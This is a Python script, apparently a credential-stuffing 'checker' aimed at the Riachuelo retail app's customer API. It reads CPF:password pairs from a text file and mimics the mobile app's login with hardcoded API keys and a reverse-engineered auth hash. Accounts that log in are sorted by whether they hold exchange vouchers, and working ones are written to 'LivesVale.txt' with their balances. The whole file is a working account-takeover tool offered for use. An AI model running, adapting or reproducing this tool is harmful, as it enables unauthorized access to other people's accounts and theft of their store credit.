import os
import json
import time
import requests
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from pyfiglet import Figlet
from colorama import Fore, Style, init
from requests.exceptions import *
init(autoreset=True)


f = Figlet(font='big')
print(colored(f.renderText('RIACHUELO'), 'green'))
print('BY: @MS40GG ')


aprovadas = 0
reprovadas = 0
custom = 0

def atualizar():
    titulo = f' [RIACHUELO] APROVADAS: {aprovadas} REPROVADAS: {reprovadas} CUSTOM: {custom} @MS40GG\n'
    os.system(f'title {titulo}')


def ensure_directory_exists(path):
    if not os.path.exists(path):
        os.makedirs(path)


alphabet = {
    'a': '?', 'b': '<', 'c': '=', 'd': ':', 'e': ';',
    'f': '8', 'g': '9', 'h': '6', 'i': '7', 'j': '4',
    'k': '5', 'l': '2', 'm': '3', 'n': '0', 'o': '1',
    'p': '.', 'q': '/', 'r': ',', 's': '-', 't': '*',
    'u': '+', 'v': '(', 'w': ')', 'x': '&', 'y': "'",
    'z': '$',
    '0': 'n', '1': 'o', '2': 'l', '3': 'm', '4': 'j',
    '5': 'k', '6': 'h', '7': 'i', '8': 'f', '9': 'g',
    '@': '\x1e', '#': '}', '$': 'z', '*': 't', '.': 'p',
    'W': '    '
}


def encrypt(string):
    encrypted_string = ''
    for char in string:
        encrypted_string += alphabet.get(char, char)
    return encrypted_string


def monta_hash(cpf, senha):
    string = f"%|*?&(?*|d|{cpf}|r|.?--)1,:|d|{senha}|#"
    hex_string = string.encode('utf-8').hex()
    return hex_string

def get_str(string, start, end):
    if not string or not start:
        return ''
    part1 = string.split(start)[1] if start in string else ''
    if not part1 or not end:
        return ''
    part2 = part1.split(end)[0]
    return part2.strip()

# Function to handle the first request
def b1(cpf, senha, proxy=None):
    time.sleep(1)  # Adiciona um delay de 1 segundo antes de cada tentativa de login
    url = 'https://9hyxh9dsj1.execute-api.us-east-1.amazonaws.com/v1//97c9dde6-6632-4c13-8310-0c210dc06d92/get-token'
    headers = {
        'Host': '9hyxh9dsj1.execute-api.us-east-1.amazonaws.com',
        'Accept': 'application/json, text/plain, */*',
        'x-api-key': 'wMpVlrbxGP56eruchHQ7v3tqzHQ13O9fFl5KbgOxmLIIqgIioUsnVmzSbGCPv9Am',
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/4.9.2'
    }
    body = json.dumps({
        "value": "ZkdTI4BvLTygcI9KACzzHJl9lYAEHMutBopBeQY5ze72wNp0x4ry2pMtbvtKL+11zwGwlP4VfRs6Oo9sLDRmWYxPFrdixPWjXlMuAxhlM/JvWdspEfPuWx2FEN0mDAY3KArR9ZT/4YgvXgFZVafgQxtqE9Zjakrs9tNkxZ0hHEdfu5XlK40Pis/Spr45/Q0uafGx5YtwWLluCIfjuXp3AGIAE/klr2mKddyx/fycSUt2uT2kkBCOkhtRXXdb+38S4Hh9cTXIwh0VT+TMi2hlnRYPedHSHnstxApm6ZsWo3GWh3vdV0jqVc/7hm+CXRjUzRr0X3rm3kr+50fJB6KX5MtR6EZWmMeKjI6VOagQNA3UXky0DC4w+fd6qYWpSEgws26/XUpDUR38GPHVo67YbaeaoJRHrGdhNrgJChdxIG0heKPa3pXX7LyFG4RAi3XFSbCVcNXT4+n5KGbI7oqHh7K7kYS7O9G/cZP16kfQPiLt0USSgyd9Zo9QBFRKKiO5dONPSvvXLe5ySPEwCM4OVOv8bOyusf9FKKbZjALm/hpq0Ufr/WgNBP5zwgfW+fvsrLqBHvJlpGVzqtKbm3BoSmX+/drgx7y/vbHIrBKjfM9lwgQTH59Y7JUZicgGHXxLsTuJ0pGWePJJB1TIDoWqC38EXFCBuNVF2lDZp/+h0/w="
    })

    try:
        response = requests.post(url, headers=headers, data=body, proxies=proxy)
        if not response.ok:
            time.sleep(5) 
            return b1(cpf, senha)

        data = response.json()
        id_token = data.get('IdToken', '')

        if id_token:
            send_next_request(id_token, cpf, senha, proxy)

    except requests.RequestException as e:
        if 'ECONNRESET' in str(e) or 'Client network socket disconnected' in str(e):
            print(f"Connection error, retrying for {cpf}:{senha}")
            time.sleep(5)
            return b1(cpf, senha)

def send_next_request(token, cpf, senha, proxy=None):
    global aprovadas, reprovadas, custom
    try:
        hash_value = monta_hash(encrypt(cpf), encrypt(senha))
        url = 'https://api-dc-rchlo-prd.riachuelo.com.br/ecommerce-app-customers/v2/customers/tokens'
        headers = {
            'Host': 'api-dc-rchlo-prd.riachuelo.com.br',
            'accept': 'application/json, text/plain, */*',
            'channel': 'app',
            'x-api-key': 'wMpVlrbxGP56eruchHQ7v3tqzHQ13O9fFl5KbgOxmLIIqgIioUsnVmzSbGCPv9Am',
            'user-agent': 'eCommerceAppReact/5955(ANDROID)',
            'app_version': '5.21.0-5955',
            'device': 'ASUS_I003DD',
            'x-app-token': token
        }
        body = json.dumps({
            "taxvat": cpf,
            "password": senha,
            "auth": hash_value
        })
        response = requests.post(url, headers=headers, data=body, proxies=proxy)
        
        customer_json = response.json()
        customer = customer_json.get('customer_token')
        if not customer:
            print(Fore.RED + Style.BRIGHT + f"REPROVADA => {cpf}:{senha}")
            reprovadas += 1
            atualizar()
            return
        
        url = 'https://api-dc-rchlo-prd.riachuelo.com.br/ecommerce-app-customers/v1/customers/exchanges'
        headers = {
        'Host': 'api-dc-rchlo-prd.riachuelo.com.br',
        #'Cookie': 'ak_bmsc=...',  # Substitua pelo seu cookie
        'accept': 'application/json, text/plain, */*',
        'channel': 'app',
        'x-api-key': 'wMpVlrbxGP56eruchHQ7v3tqzHQ13O9fFl5KbgOxmLIIqgIioUsnVmzSbGCPv9Am',
        'user-agent': 'eCommerceAppReact/5955(ANDROID)',
        'app_version': '5.21.0-5955',
        'device': 'ASUS_I003DD',
        'authorization': customer, 
        'x-app-token': token  
        }
        response2 = requests.get(url=url, headers=headers)

        if response2.status_code != 200:
            return  

        url4 = response2.text
        if not url4:
            return  

        if '"active":[{"code":' not in url4:
            print(Fore.CYAN + f"[CUSTOM] - {cpf}:{senha} | NAO POSSUI VALES TROCA")
            custom += 1
            atualizar()
            
            
            ensure_directory_exists('./retornos/')
            
            with open('./retornos/SemVales.txt', 'a') as f:
                f.write(f"[CUSTOM] - {cpf}:{senha} | NAO POSSUI VALES TROCA\n")
            return

        data_vale = response2.json()
        message = data_vale.get("message", "")
        active_values = [voucher['value'] for voucher in data_vale.get("data", {}).get("active", [])]
        inactive_vouchers = data_vale.get("data", {}).get("inactive", [])
        print(Fore.GREEN + Style.BRIGHT + f"[APROVADA] => - {cpf}:{senha} | ValesAtivos: {active_values}")
        aprovadas += 1
        atualizar()
            
          
        ensure_directory_exists('./retornos/')
            
        with open('./retornos/LivesVale.txt', 'a') as f:
            f.write(f"[ LIVE ] - {cpf}:{senha} | Saldo: {active_values}\n")

    except(ProxyError, SSLError, HTTPError, ConnectionError, ReadTimeout) as e:
        if 'ECONNRESET' in str(e) or 'Client network socket disconnected' in str(e):
            print(f"Error retestando {cpf}:{senha}")
            time.sleep(5)
            send_next_request(token, cpf, senha, proxy)


def process_txt(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = [line.strip() for line in file if line.strip()]  # Remove linhas vazias ou em branco

    for index, line in enumerate(lines, start=1):
        try:
            if ':' not in line:
                raise ValueError(f"Linha {index} inválida (formato esperado: 'cpf:senha'): {line}")
            
            cpf, senha = line.split(':', 1)
            print(f"[INFO] Processando linha {index}: {cpf}:{senha}")
            b1(cpf, senha)  # Chama a função diretamente
        except Exception as e:
            print(Fore.RED + f"[ERRO] Não foi possível processar a linha {index}: {e}")





atualizar()
process_txt('cpf.txt')
